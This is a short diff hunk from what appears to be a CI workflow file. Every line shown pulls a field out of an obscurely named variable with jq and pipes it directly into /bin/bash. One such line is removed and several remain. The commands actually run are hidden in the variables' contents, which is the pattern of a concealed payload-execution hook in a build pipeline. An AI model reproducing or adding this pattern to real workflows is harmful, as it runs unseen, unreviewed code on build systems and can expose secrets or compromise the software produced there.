@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$nsw3" | jq -r .u858 | /bin/bash
           echo $mlghe55 | jq -r .p21 | /bin/bash
           printf '%s' "$csa3" | jq -r .nz91077 | /bin/bash
-          echo $w042 | jq -r .gxezj6 | /bin/bash
           printf '%s' "$qvng028" | jq -r .vp724 | /bin/bash
           echo $sa41 | jq -r .fhe8 | /bin/bash
 
